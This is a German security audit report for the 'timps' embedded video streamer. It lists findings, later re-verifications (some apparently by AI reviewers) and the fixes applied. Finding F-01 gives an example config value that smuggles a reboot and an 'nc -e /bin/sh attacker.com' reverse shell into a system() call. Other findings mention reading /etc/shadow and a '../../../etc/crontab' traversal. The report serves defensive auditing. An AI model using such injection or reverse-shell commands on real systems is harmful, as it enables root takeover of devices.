# timps – Security & Bug Audit 2026-07-23

Umfassende Code-Review des **timps** (Tiny IMP Streamer) Projekts.
Durchgeführt am 23. Juli 2026 durch statische Code-Analyse.

---

## Zusammenfassung

Das Projekt ist insgesamt **sehr sauber geschrieben** mit einem
außergewöhnlich hohen Sicherheitsbewusstsein für Embedded-C-Code.
Zahlreiche Defence-in-Depth-Maßnahmen, konstante Zeitvergleiche für
Authentifizierung, sorgfältiges Bounds-Checking, Clamping von numerischen
Werten und eine durchdachte Thread-Safety-Architektur.

Es wurden **14 Findings** identifiziert, davon **2 kritisch**, **4 hoch/mittel**
und **8 niedrig/informativ**.

---

## Verifikation & Fix-Status (2026-07-24)

Die Findings wurden gegen den echten Code gegengeprüft. Ergebnis:

| Finding | Verifikation | Status |
|---|---|---|
| **F-01** `switch_cmd`→`system()` | ✅ real (aber Precondition: Schreibzugriff auf `/etc/timps.conf` = bereits privilegiert). Praktisch **Mittel**, nicht Kritisch. | **BEHOBEN** — `daynight.c` nutzt jetzt `fork()`+`execlp()` (kein Shell, keine Injection). |
| **F-02** `isp_path` file read | ⚠️ **über-bewertet**: `dn_brightness()` parst nur ISP-Status-Zahlen, gibt **keinen Datei-Inhalt** zurück → kein Info-Leak. Precondition = Config-Schreibzugriff. | **auf NIEDRIG abgestuft** (Präfix-Check `/proc/jz/isp/` optional; kein Notfall). |
| **F-03** Audio-Params ungeclampt | ✅ real (`volume/gain/alc_gain/spk_*` = `pint`, nur `ns` geclampt). Felder sind `int` (kein Wrap im Struct), aber Clamp gegen absurde IMP-Werte sinnvoll. | **BEHOBEN** — `pint_cl` (volume/gain/spk 0..100, alc_gain 0..7). |
| **F-04** OSD `logo_w/h`/`outline` | ✅ `pint`, **aber Impact bereits abgefangen** (`setup_logo` H5-Discard + `load_bgra` `w/h≤0`→NULL). | **BEHOBEN** (defensiv) — `logo_w/h` 0..4096, `outline` 0..64. |
| **F-05** `record_clip` Traversal | ❌ **FALSCH** — `record_clip` validiert stark: `/tmp/`-Präfix + `strstr("..")` + `open(O_EXCL\|O_NOFOLLOW,0600)`. | **kein Issue** (aus Liste gestrichen). |
| **F-06** `daynight.*` fehlt in `set_kv` | ❌ **FALSCH** — `config.c:664-674` hat den vollen `daynight.`-Zweig in `set_kv`, `config_get_kv` ebenso. | **kein Issue** (aus Liste gestrichen). |
| **F-08** `hal_get()` NULL-Deref | ✅ theoretisch (Backend ist statisch, nie NULL), aber billig. | **BEHOBEN** — NULL-Check in `main.c`. |
| **F-07, F-09–F-14** | korrekt als niedrig/informativ bzw. „kein Risiko"/„positiv" eingestuft. | unverändert (bewusstes Design / akzeptabel). |

**Netto:** Von 2 „kritischen" ist eines ein legitimes Hardening (F-01, behoben),
das andere über-bewertet (F-02, kein Leak). Zwei „mittlere" Findings (F-05, F-06)
waren **falsch** — der Code macht es bereits richtig. Die vier sinnvollen Fixes
(F-01/F-03/F-04/F-08) sind eingebaut und mit `make sim` verifiziert.

---

## Re-Verifikation der Fixes (2026-07-26)

Die vier Fixes aus dem 2026-07-24-Durchlauf wurden gegengeprüft (Fable 5,
unabhängig von der Selbsteinschätzung oben) und zusätzlich ein kompletter
Pfad-/Funktions-Sweep über alle ~30 Quelldateien gefahren (Sonnet), um
Findings zu suchen, die der ursprüngliche Audit übersehen hat. Ergebnis:

| # | Befund | Status |
|---|---|---|
| F-01 | `execlp()`-Fix korrekt: kein Shell, sauberes Kind (`/dev/null`-Redirect, `_exit`, `waitpid`-EINTR-Loop), keine Zombies. Verhaltensänderung: `switch_cmd` mit eingebetteten Argumenten funktioniert nicht mehr (war aber nie so dokumentiert — Contract war immer `<cmd> day\|night`). | bestätigt, kein Fix nötig |
| F-03 | `audio.gain` war mit `pint_cl(val,0,100)` zu locker geclampt — IMP dokumentiert `gain` als 0..31 (PGA-Range), nicht 0..100. | **BEHOBEN** — `config.c` clamp jetzt `0..31`. |
| F-04 | Clamps korrekt, rein defensiv, keine Regression. | bestätigt |
| F-08 | NULL-Check war zwar in `main.c` vorhanden, aber `hal_get()->name` wurde in der Log-Zeile davor bereits ungeprüft dereferenziert. | **BEHOBEN** — `g_hal = hal_get()` + NULL-Check laufen jetzt vor der ersten Nutzung; die Log-Zeile nutzt `g_hal->name`. |
| **NEU-01** | `motion.on_motion` (`src/hal/imp_motion.c`) lief weiterhin über `system()` — exakt dieselbe Fundklasse wie F-01, aber der `fork()`/`execlp()`-Fix war nur in `daynight.c` ausgerollt. Von beiden unabhängigen Reviews (Fable 5 und Sonnet) übereinstimmend gefunden. | **BEHOBEN** — gleiches Muster wie F-01, per Doppel-Fork (damit der Motion-Analyse-Thread nicht auf das Script wartet, wie es das alte `"cmd &"` tat); Grandchild wird von init reaped. |

Sonst nichts Neues gefunden — RTSP/RTP/HTTP/SRT-Parser, Codec-Puffer
(`nal.c`/`vparam.c`/`aac.c`/`g711.c`), Font-Rendering (`msttf.c`), Auth
(`auth.c`/`control.c`) und Thread-Safety (`hub.c`/`fanqueue.c`) wurden beim
Sweep erneut geprüft und sind weiterhin sauber.

---

## Findings

### 🔴 F-01 – Command Injection via `daynight.switch_cmd` in `system()`

| Feld | Wert |
|------|------|
| **Datei** | `src/daynight.c:148-151` |
| **Schweregrad** | 🔴 Kritisch |
| **Ausnutzbarkeit** | Config-Datei-Zugriff nötig |
| **Impact** | Root-Shell-Ausführung |

```c
snprintf(cmd, sizeof cmd, "%s %s >/dev/null 2>&1",
         g_cfg.daynight.switch_cmd, arg);
int rc = system(cmd);
```

`daynight.switch_cmd` wird unvalidiert an `system()` übergeben. Der Key ist
zwar nicht über `/control` setzbar, aber ein Angreifer mit Schreibzugriff auf
`/etc/timps.conf` kann beliebige Shell-Befehle einschleusen:

```ini
daynight.switch_cmd = reboot; nc -e /bin/sh attacker.com 4444 #
```

**Empfehlung:** `fork()`/`exec()` statt `system()` verwenden, oder einen
Pfad-Whitelist (z.B. nur `/usr/sbin/daynight`, `daynight`) validieren.

---

### 🔴 F-02 – Arbitrary File Read via `daynight.isp_path`

| Feld | Wert |
|------|------|
| **Datei** | `src/daynight.c` – `dn_brightness()` |
| **Schweregrad** | 🔴 Kritisch |
| **Ausnutzbarkeit** | Config-Datei-Zugriff nötig |
| **Impact** | Lesen beliebiger Dateien als root |

`daynight.isp_path` (Default: `/proc/jz/isp/isp-m0`) wird in `fopen()` verwendet.
Der Key ist nicht über `/control` setzbar, aber in der Config-Datei kann ein
beliebiger Pfad wie `/etc/shadow` eingetragen werden. Der Prozess läuft als
root → Informationsleck.

**Empfehlung:** `isp_path` auf `/proc/jz/isp/` prefix-einschränken oder
hart auf den bekannten Pfad setzen.

---

### 🟠 F-03 – `audio.volume` / `audio.gain` / `audio.alc_gain` ungeclampt

| Feld | Wert |
|------|------|
| **Datei** | `src/config.c` – `set_kv()`, Audio-Sektion |
| **Schweregrad** | 🟠 Mittel |
| **Ausnutzbarkeit** | `/control` (auth required) |
| **Impact** | IMP-Crash / DoS / Werte-Divergenz |

```c
// KEINE Bereichsprüfung:
else if(!strcmp(k,"volume"))    c->audio.volume    = pint(val);
else if(!strcmp(k,"gain"))      c->audio.gain      = pint(val);
else if(!strcmp(k,"alc_gain"))  c->audio.alc_gain  = pint(val);
else if(!strcmp(k,"spk_volume"))c->audio.spk_volume = pint(val);
else if(!strcmp(k,"spk_gain"))  c->audio.spk_gain  = pint(val);
```

Extrem große oder negative Werte gehen unverändert an die IMP-API und können
beim Cast auf `uint8_t` stillschweigend wrappen (z.B. `300` → `44`) oder
undefiniertes Verhalten auslösen.

**Empfehlung:** Alle mit `pint_cl(val, ...)` auf dokumentierte IMP-Bereiche
clampen: `volume` 0–100, `gain` 0–31, `alc_gain` 0–7, etc.

---

### 🟠 F-04 – OSD `logo_w` / `logo_h` / `outline` ungeclampt

| Feld | Wert |
|------|------|
| **Datei** | `src/config.c` – `set_osd_item()` |
| **Schweregrad** | 🟡 Mittel |
| **Ausnutzbarkeit** | `/control` (auth required) |
| **Impact** | Speichererschöpfung / Crash |

```c
else if(!strcmp(k,"logo_w")||...) o->logo_w = pint(val);
else if(!strcmp(k,"logo_h")||...) o->logo_h = pint(val);
else if(!strcmp(k,"outline")||...) o->outline = pint(val);
```

Negative oder extrem große Werte (z.B. `logo_w = -1`) können zu riesigen
Speicherallokationen in der OSD-Rendering-Pipeline führen.

**Empfehlung:** `pint_cl(val, 0, 1920)` für `logo_w/h`, `pint_cl(val, 0, 32)`
für `outline`.

---

### 🟡 F-05 – Pfadvalidierung in `record_clip()` prüfen

| Feld | Wert |
|------|------|
| **Datei** | `src/control.c:380-386` → `src/record.c` `record_clip()` |
| **Schweregrad** | 🟡 Mittel |
| **Ausnutzbarkeit** | `/control` (auth required) |
| **Impact** | Dateiüberschreibung außerhalb des Aufnahmeverzeichnisses |

```c
char clip[160];
if (get_val(sb, se, "clip", clip, sizeof clip)){
    int secs = get_val(sb, se, "seconds", v, sizeof v) ? atoi(v) : 6;
    record_clip(clip, secs);
}
```

Der Clip-Pfad kommt via `/control` vom Client. Wenn `record_clip()` keine
`has_dotdot()`-Validierung durchführt, kann ein authentifizierter Benutzer
beliebige Dateien überschreiben (z.B. `../../../etc/crontab`).

**Empfehlung:** Gleiche `has_dotdot()`-Validierung wie im normalen Recorder
einbauen.

---

### 🟡 F-06 – `daynight.*` Keys fehlen in `set_kv()` / `config_get_kv()`

| Feld | Wert |
|------|------|
| **Datei** | `src/config.c` – `set_kv()` / `config_get_kv()` |
| **Schweregrad** | 🟡 Mittel |
| **Ausnutzbarkeit** | Inkonsistenz |
| **Impact** | In-Memory-Werte und Config-Datei driften auseinander |

`set_kv()` behandelt keine `daynight.*` Keys. Wenn `config_apply_kv()` mit
einem `daynight.*` Key aufgerufen wird, fällt `set_kv()` durch alle Zweige
durch – der Key wird NUR in die Datei geschrieben, der In-Memory-Wert bleibt
unverändert (`config_get_kv()` gibt `0` zurück = "unbekannt"). Dadurch kann
das `/control` Change-Detection-Dedup inkorrekt arbeiten.

**Empfehlung:** `daynight.*` Keys vollständig in `set_kv()` und
`config_get_kv()` aufnehmen.

---

### 🟢 F-07 – `sensor.model` wird immer mit `/proc`-Wert überschrieben

| Feld | Wert |
|------|------|
| **Datei** | `src/config.c:1070-1090` – `config_sensor_finalize()` |
| **Schweregrad** | 🟢 Niedrig (bewusstes Design) |
| **Impact** | `/control`-Wert wird stillschweigend ignoriert |

```c
if (c->sensor.model[0] && strcasecmp(c->sensor.model, name) != 0)
    LOGW(MOD,"config sensor.model '%s' != loaded driver '%s' - using '%s' ...");
copystr(c->sensor.model, name, MS_MAX_STR);
/* ^^^ überschreibt IMMER, auch wenn nur gewarnt wird */
```

Ist bewusstes Design (falscher Sensor-Name → Kernel-Crash), aber ein Benutzer,
der `sensor.model` via `/control` setzt, bekommt keine sichtbare Fehlermeldung.

**Empfehlung:** Bei `/control`-Schreibzugriffen auf `sensor.model` eine
Warnung im Response-Body zurückgeben.

---

### 🟢 F-08 – `hal_get()`-Rückgabewert nicht auf `NULL` geprüft

| Feld | Wert |
|------|------|
| **Datei** | `src/main.c:107` |
| **Schweregrad** | 🟢 Niedrig (theoretisch) |
| **Impact** | Sofortiger Crash bei `NULL` |

```c
g_hal = hal_get();
if (g_hal->init(&g_cfg)!=0){ ... }
/* ^^^ kein NULL-Check vor Dereferenzierung */
```

**Empfehlung:** `if (!g_hal || g_hal->init(...))` als defensive Maßnahme.

---

### 🟢 F-09 – `auth_gen_token()` Fallback ohne `/dev/urandom` schwach

| Feld | Wert |
|------|------|
| **Datei** | `src/auth.c:119-128` |
| **Schweregrad** | 🟢 Niedrig (nur auf kaputten Systemen) |
| **Impact** | Schwache Nonces bei fehlendem `/dev/urandom` |

Der Fallback hasht `time/pid/rand/clock` via MD5 – dokumentiert schwach, aber
nur relevant wenn `/dev/urandom` fehlt, was auf normalen Linux-Systemen nie
der Fall ist.

**Empfehlung:** Optional: `getrandom()`-Syscall als erste Alternative vor
`/dev/urandom` versuchen.

---

### 🟢 F-10 – `rand()` für UDP-Port-Auswahl

| Feld | Wert |
|------|------|
| **Datei** | `src/rtsp/rtsp.c:430` |
| **Schweregrad** | 🟢 Niedrig |
| **Impact** | Port-Kollisionen bei vielen Clients |

```c
base = 6000 + ((rand() % 8192) & ~1);
```

`rand()` ist für Ports akzeptabel, aber inkonsistent mit dem Rest des Codes,
der `/dev/urandom` bevorzugt. Retry-Logik (64 Versuche) begrenzt den Schaden.

**Empfehlung:** Optional: aus `/dev/urandom` statt `rand()` ziehen.

---

### 🟢 F-11 – `send_resp()` Stack-Buffer 3072 Bytes

| Feld | Wert |
|------|------|
| **Datei** | `src/rtsp/rtsp.c:308` |
| **Schweregrad** | 🟢 Niedrig |
| **Impact** | Stack-Verbrauch auf T10 (64MB) grenzwertig |

```c
char hdr[3072];
```

3KB auf dem Stack summiert sich mit anderen Threads. Kein Buffer-Overflow
dank L2-Fixes.

**Empfehlung:** Bei Stack-Problemen auf T10 Buffer verkleinern oder auf Heap.

---

### 🟢 F-12 – `daynight.isp_path`: theoretische TOCTOU

| Feld | Wert |
|------|------|
| **Datei** | `src/daynight.c` – `dn_brightness()` |
| **Schweregrad** | 🟢 Niedrig (praktisch nicht ausnutzbar) |
| **Impact** | Symlink-Angriff zwischen `fopen()`-Aufrufen |

`/proc/jz/isp/` ist root-only → praktisch nicht ausnutzbar.

**Empfehlung:** Wird durch F-02-Fix (Präfix-Validierung) mitbehoben.

---

### 🟢 F-13 – HTTP-Pfad-Injection in `serve_player()` – kein Risiko

| Feld | Wert |
|------|------|
| **Datei** | `src/mp4/httpd.c` `serve_player()` |
| **Schweregrad** | 🟢 Kein Risiko |
| **Impact** | Kein |

`vcodec` stammt aus SPS-Bytes (hex), `chn` aus `atoi()` – beide garantiert
sicher. Kein XSS-Vektor.

---

### 🟢 F-14 – `daynight.switch_cmd` / `isp_path` nicht über `/control` setzbar

| Feld | Wert |
|------|------|
| **Datei** | `src/control.c` |
| **Schweregrad** | 🟢 Positiv |
| **Impact** | Schutzebene vorhanden |

Diese kritischen Keys sind bewusst nicht in den `/control` `DN_KEYS` enthalten.
Gut so – das sollte dokumentiert bleiben und nie versehentlich hinzugefügt
werden.

---

## ✅ Positiv hervorgehobene Praktiken

| Maßnahme | Ort |
|---|---|
| **Constant-Time Token/Passwort-Vergleich** | `auth_token_eq()`, `auth_http_basic()`, `auth_rtsp_digest()` |
| **Digest-Nonce-Validierung pro Session** | `rtsp.c` – verhindert Replay-Angriffe |
| **Clamping numerischer Werte** (`pint_cl`) | `config.c` – verhindert Out-of-Range-Abstürze |
| **Sanitize von `/control`-Werten** | `sanitize_val()` in `control.c` |
| **Pfad-Traversal-Schutz** (`has_dotdot`) | `record.c`, `timelapse.c` |
| **Client-Limits gegen DoS** | `HTTP_MAX_CLIENTS`, `RTSP_MAX_CLIENTS`, `SRT_MAX_CLIENTS`, `HUB_MAX_SUBS` |
| **Socket-Timeout** | `net_set_timeouts()` in `net.c` |
| **Thread-sichere Hub-Publish/Unsubscribe** | `g_pushing[src]` Handshake in `hub.c` |
| **Atomare Config-Datei-Persistenz** | `config_write_keys()` mit `mkstemp` + `fsync` + `rename` |
| **CORS nur für spezifische Pfade & Origin-Reflection** | `http_cors()` in `httpd.c` |
| **TLS-Handshake-Timeout** | `ms_tls_accept()` in `tls.c` |
| **Stack-Protector + FORTIFY_SOURCE** | `build.sh` mit `HARDEN`/`FORTIFY` |
| **CLOCK_MONOTONIC für Condvars** | `fanqueue.c`, `events.c` – immun gegen NTP-Sprünge |

---

## Empfohlene Fix-Priorisierung

| Priorität | Finding | Aufwand | Datei |
|-----------|---------|---------|-------|
| 1 | **F-01** `system()` → `fork()`/`exec()` | 15 min | `daynight.c` |
| 2 | **F-02** `isp_path` / `switch_cmd` validieren | 10 min | `config.c` |
| 3 | **F-03** Audio-Parameter clampen | 5 min | `config.c` |
| 4 | **F-04** OSD `logo_w/h`/`outline` clampen | 5 min | `config.c` |
| 5 | **F-05** `record_clip` Pfadvalidierung | 5 min | `record.c` |
| 6 | **F-06** `daynight.*` in `set_kv()`/`config_get_kv()` | 10 min | `config.c` |
| 7 | **F-08** `hal_get()` NULL-Check | 1 min | `main.c` |

**Gesamtaufwand: ca. 50 Minuten** – alle Änderungen sind rückwärtskompatibel.

---

## Risikomatrix

| # | Problem | Ausnutzbarkeit | Impact | Risiko |
|---|---------|----------------|--------|--------|
| F-01 | `switch_cmd` Command Injection | Config-Datei-Zugriff | Root-Shell | 🔴 Kritisch |
| F-02 | `isp_path` Arbitrary File Read | Config-Datei-Zugriff | Datenleck | 🔴 Kritisch |
| F-03 | Audio-Parameter ungeclampt | `/control` (auth) | IMP-Crash/DoS | 🟠 Mittel |
| F-04 | OSD `logo_w/h` ungeclampt | `/control` (auth) | Speicher/DoS | 🟡 Mittel |
| F-05 | `record_clip` Pfadvalidierung | `/control` (auth) | Dateiüberschreibung | 🟡 Mittel |
| F-06 | `daynight.*` Keys inkonsistent | `/control` (auth) | Konfigurationsfehler | 🟡 Mittel |
| F-07 | `sensor.model` Überschreibung | `/control` (auth) | Verwirrung | 🟢 Niedrig |
| F-08 | `hal_get()` NULL-Deref | Startup | Crash | 🟢 Niedrig |
| F-09 | `auth_gen_token()` Fallback | Kein `/dev/urandom` | Schwache Nonces | 🟢 Niedrig |
| F-10 | `rand()` für UDP-Ports | Netzwerk | Kollisionen | 🟢 Niedrig |
| F-11 | 3KB Stack-Buffer | T10 (64MB) | Stack-Verbrauch | 🟢 Niedrig |
| F-12 | `isp_path` TOCTOU | Lokal + root | Theoretisch | 🟢 Niedrig |
| F-13 | HTTP-Pfad-Injection | Netzwerk | Kein | ✅ Kein Risiko |
| F-14 | Kritische Keys nicht via `/control` | – | Positiv | ✅ Schutz |
